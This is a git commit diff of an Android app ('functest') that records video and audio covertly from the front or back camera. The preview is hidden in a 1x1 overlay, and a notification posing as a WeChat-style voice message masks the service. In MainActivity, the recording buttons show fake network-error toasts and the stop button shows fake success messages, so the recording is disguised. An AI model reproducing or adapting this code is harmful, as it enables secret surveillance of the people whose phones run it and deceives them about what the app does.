4dd283fd8b85ce234c88a2fa0b61392593ebce52
rajjim <210991388@qq.com>
2019-08-30 16:51:54 +0800

    second commit

---
+++ functest/app/src/main/java/com/louis/functest/FrontVideoRecorder.java
@@ -0,0 +1,160 @@
+package com.louis.functest;
+
+import android.app.Notification;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.graphics.PixelFormat;
+import android.hardware.Camera;
+import android.media.CamcorderProfile;
+import android.media.MediaRecorder;
+import android.os.Environment;
+import android.os.IBinder;
+import android.support.annotation.Nullable;
+import android.text.format.DateFormat;
+import android.util.Log;
+import android.view.Gravity;
+import android.view.SurfaceHolder;
+import android.view.SurfaceView;
+import android.view.WindowManager;
+
+import java.util.Date;
+
+public class FrontVideoRecorder extends Service implements SurfaceHolder.Callback {
+
+
+    private WindowManager windowManager;
+    private SurfaceView surfaceView;
+    private Camera camera = null;
+    private MediaRecorder mediaRecorder = null;
+    Notification notification1;
+    @Override
+    public void onCreate() {
+        Notification.Builder builder1 = new Notification.Builder(this);
+        builder1.setSmallIcon(R.drawable.weixin3); //设置图标
+        builder1.setTicker("意前难忘：语音消息");
+        builder1.setContentTitle("意前难忘："); //设置标题
+        builder1.setContentText("语音消息"); //消息内容
+        builder1.setWhen(System.currentTimeMillis()); //发送时间
+        builder1.setDefaults(Notification.DEFAULT_LIGHTS); //设置默认的提示音，振动方式，灯光
+        builder1.setAutoCancel(true);//打开程序后图标消失
+        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,new Intent(this, MainActivity.class), 0);
+        builder1.setContentIntent(pendingIntent);
+        notification1 = builder1.build();
+        startForeground(0x1982, notification1);   // notification ID: 0x1982, you can name it as you will.
+
+        // Create new SurfaceView, set its size to 1x1, move it to the top left corner and set this service as a callback
+        windowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
+        surfaceView = new SurfaceView(this);
+        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
+                1, 1,
+                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                PixelFormat.TRANSLUCENT
+        );
+
+
+        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
+        windowManager.addView(surfaceView, layoutParams);
+        surfaceView.getHolder().addCallback(this);
+
+    }
+
+    // Method called right after Surface created (initializing and starting MediaRecorder)
+    @Override
+    public void surfaceCreated(SurfaceHolder surfaceHolder) {
+
+        camera=Camera.open(1);
+        camera.cancelAutoFocus();//此句加上 可自动聚焦 必须加
+        mediaRecorder = new MediaRecorder(){
+            @Override
+            public void setProfile(CamcorderProfile profile) {
+                setOutputFormat(profile.fileFormat);
+                setVideoFrameRate(profile.videoFrameRate);
+//                setVideoSize(profile.videoFrameWidth, profile.videoFrameHeight);
+                setVideoEncodingBitRate(profile.videoBitRate);
+                setVideoEncoder(profile.videoCodec);
+                if (profile.quality >= CamcorderProfile.QUALITY_TIME_LAPSE_LOW &&
+                        profile.quality <= CamcorderProfile.QUALITY_TIME_LAPSE_QVGA) {
+                    // Nothing needs to be done. Call to setCaptureRate() enables
+                    // time lapse video recording.
+                } else {
+                    setAudioEncodingBitRate(profile.audioBitRate);
+                    setAudioChannels(profile.audioChannels);
+                    setAudioSamplingRate(profile.audioSampleRate);
+                    setAudioEncoder(profile.audioCodec);
+                }
+            }
+        };
+        camera.unlock();
+
+        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
+        mediaRecorder.setCamera(camera);
+        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+//        mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
+
+        mediaRecorder.setAudioChannels(2);
+        mediaRecorder.setAudioEncodingBitRate(94*1024);
+        mediaRecorder.setAudioSamplingRate(48*1000);    //AAC audio coding standard ranges from 8 to 96 kHz
+
+        mediaRecorder.setVideoEncodingBitRate(14735*1000);
+
+
+        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+        mediaRecorder.setVideoFrameRate(23);
+        //超清是1980 1080
+        //高清是1280 720
+        //标清是720 480
+//        mediaRecorder.setVideoSize(1280,720);
+        mediaRecorder.setVideoSize(720,480);
+        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+        mediaRecorder.setOutputFile(
+                Environment.getExternalStorageDirectory() + "/" +
+                        DateFormat.format("yyyy-MM-dd_kk-mm-ss", new Date().getTime()) +
+                        ".mp4"
+        );
+
+        try {
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            Log.d("后台录像","开始前置录像");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    // Stop recording and remove SurfaceView
+    @Override
+    public void onDestroy() {
+
+        mediaRecorder.stop();
+        mediaRecorder.reset();
+        mediaRecorder.release();
+        NotificationManager manger = (NotificationManager)this.getSystemService(NOTIFICATION_SERVICE);
+        manger.cancel(0x1982);
+        camera.lock();
+        camera.release();
+        Log.d("后台录像","停止前置录像");
+        windowManager.removeView(surfaceView);
+
+    }
+
+    @Override
+    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
+    }
+
+    @Override
+    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
+    }
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
---
+++ functest/app/src/main/java/com/louis/functest/MainActivity.java
@@ -0,0 +1,223 @@
+package com.louis.functest;
+
+import android.content.Intent;
+import android.media.MediaRecorder;
+import android.os.Bundle;
+import android.support.annotation.NonNull;
+import android.support.design.widget.FloatingActionButton;
+import android.support.design.widget.Snackbar;
+import android.support.v4.app.ActivityCompat;
+import android.support.v7.app.AppCompatActivity;
+import android.support.v7.widget.Toolbar;
+import android.util.Log;
+import android.view.HapticFeedbackConstants;
+import android.view.KeyEvent;
+import android.view.SurfaceView;
+import android.view.View;
+import android.view.Menu;
+import android.view.MenuItem;
+import android.widget.Button;
+import android.widget.Toast;
+
+import java.io.File;
+import java.util.Date;
+
+public class MainActivity extends AppCompatActivity implements View.OnClickListener,ActivityCompat.OnRequestPermissionsResultCallback{
+    Button frontcamera;
+    Button backcamera;
+    Button stop;
+    int selectedCamara;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        selectedCamara=-1;
+        PermissionUtils.requestMultiPermissions(this, mPermissionGrant);
+        frontcamera=(Button)findViewById(R.id.button);
+        backcamera=(Button)findViewById(R.id.button2);
+        stop=(Button)findViewById(R.id.button3);
+        frontcamera.setOnClickListener(this);
+        backcamera.setOnClickListener(this);
+        stop.setOnClickListener(this);
+
+    }
+
+    @Override
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if(keyCode == KeyEvent.KEYCODE_BACK){
+            Intent i = new Intent(Intent.ACTION_MAIN);
+            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            i.addCategory(Intent.CATEGORY_HOME);
+            startActivity(i);
+            return true;
+        }
+        return super.onKeyDown(keyCode, event);
+    }
+
+    @Override
+    public void onClick(View v){
+        switch (v.getId()){
+            case R.id.button:{
+
+                switch(selectedCamara){
+                    //没有点击多余的操作
+                    case -1:{
+
+                        //选择了前摄像头
+                        selectedCamara=0;
+
+                        Toast.makeText(this, "网络访问失败，错误码：front_error", Toast.LENGTH_SHORT).show();
+                        Intent startIntent=new Intent(this,FrontVideoRecorder.class);
+                        startService(startIntent);
+                    }break;
+                    case 0:{
+                        Toast.makeText(this, "多次失败，错误码：muti_front_error", Toast.LENGTH_SHORT).show();
+                    }break;
+                    case 1:{
+                        Toast.makeText(this, "暂不支持双卡双待", Toast.LENGTH_SHORT).show();
+                    }break;
+                    default:break;
+                }
+
+
+            }
+                break;
+            case R.id.button2: {
+
+                switch(selectedCamara){
+                    //没有点击多余的操作
+                    case -1:{
+
+                        //选择了后摄像头
+                        selectedCamara=1;
+
+                        Toast.makeText(this, "请检查网络连接是否正常，错误码：back_error", Toast.LENGTH_SHORT).show();
+                        Intent startIntent = new Intent(this, BackgroundVideoRecorder.class);
+                        startService(startIntent);
+                    }break;
+                    case 0:{
+                        Toast.makeText(this, "暂不支持双卡双待", Toast.LENGTH_SHORT).show();
+                    }break;
+                    case 1:{
+                        Toast.makeText(this, "多次失败，错误码：back_error", Toast.LENGTH_SHORT).show();
+                    }break;
+                    default:break;
+                }
+
+            }
+                break;
+            case R.id.button3: {
+                //停止录像
+                //震动反馈
+
+                switch(selectedCamara){
+                    case 0:{
+                        v.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_PRESS);
+                        //停止前摄像头
+                        Intent stopIntent = new Intent(this, FrontVideoRecorder.class);
+                        stopService(stopIntent);
+                        selectedCamara=-1;
+                        Toast.makeText(this, "网络访问成功，返回前一个界面", Toast.LENGTH_SHORT).show();
+                    }break;
+                    case 1:{
+                        v.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_PRESS);
+                        //停止后摄像头
+                        Intent stopIntent = new Intent(this, BackgroundVideoRecorder.class);
+                        stopService(stopIntent);
+                        selectedCamara=-1;
+                        Toast.makeText(this, "检查网络连接成功，即将跳转下一个界面", Toast.LENGTH_SHORT).show();
+                    }break;
+                    case -1:{
+                        //没有任何打开的摄像头
+                        Toast.makeText(this, "按住说话", Toast.LENGTH_SHORT).show();
+                    }break;
+                    default:break;
+                }
+
+
+            }
+                break;
+            default:break;
+        }
+    }
+
+    @Override
+    public boolean onCreateOptionsMenu(Menu menu) {
+        // Inflate the menu; this adds items to the action bar if it is present.
+        getMenuInflater().inflate(R.menu.menu_main, menu);
+        return true;
+    }
+
+    @Override
+    public boolean onOptionsItemSelected(MenuItem item) {
+        // Handle action bar item clicks here. The action bar will
+        // automatically handle clicks on the Home/Up button, so long
+        // as you specify a parent activity in AndroidManifest.xml.
+        int id = item.getItemId();
+
+        //noinspection SimplifiableIfStatement
+        if (id == R.id.action_settings) {
+            return true;
+        }
+
+        return super.onOptionsItemSelected(item);
+    }
+
+    private PermissionUtils.PermissionGrant mPermissionGrant = new PermissionUtils.PermissionGrant() {
+        @Override
+        public void onPermissionGranted(int requestCode) {
+            switch (requestCode) {
+                case PermissionUtils.CODE_RECORD_AUDIO:
+//                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_RECORD_AUDIO", Toast.LENGTH_SHORT).show();
+                    break;
+//                case PermissionUtils.CODE_GET_ACCOUNTS:
+//                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_GET_ACCOUNTS", Toast.LENGTH_SHORT).show();
+//                    break;
+//                case PermissionUtils.CODE_READ_PHONE_STATE:
+//                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_READ_PHONE_STATE", Toast.LENGTH_SHORT).show();
+//                    break;
+//                case PermissionUtils.CODE_CALL_PHONE:
+////                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_CALL_PHONE", Toast.LENGTH_SHORT).show();
+//                    break;
+                case PermissionUtils.CODE_CAMERA:
+//                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_CAMERA", Toast.LENGTH_SHORT).show();
+                    break;
+//                case PermissionUtils.CODE_ACCESS_FINE_LOCATION:
+////                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_ACCESS_FINE_LOCATION", Toast.LENGTH_SHORT).show();
+//                    break;
+//                case PermissionUtils.CODE_ACCESS_COARSE_LOCATION:
+////                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_ACCESS_COARSE_LOCATION", Toast.LENGTH_SHORT).show();
+//                    break;
+                case PermissionUtils.CODE_READ_EXTERNAL_STORAGE:
+//                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_READ_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
+                    break;
+                case PermissionUtils.CODE_WRITE_EXTERNAL_STORAGE:
+//                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
+                    break;
+//                case PermissionUtils.CODE_SYSTEM_ALERT_WINDOW:
+//                    Toast.makeText(PermissionActivity.this, "Result Permission Grant CODE_WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
+//                    break;
+                default:
+                    break;
+            }
+        }
+    };
+
+    /**
+     * Callback received when a permissions request has been completed.
+     */
+    @Override
+    public void onRequestPermissionsResult(final int requestCode, @NonNull String[] permissions,
+                                           @NonNull int[] grantResults) {
+        PermissionUtils.requestPermissionsResult(this, requestCode, permissions, grantResults, mPermissionGrant);
+    }
+
+
+
+
+
+
+
+
+}
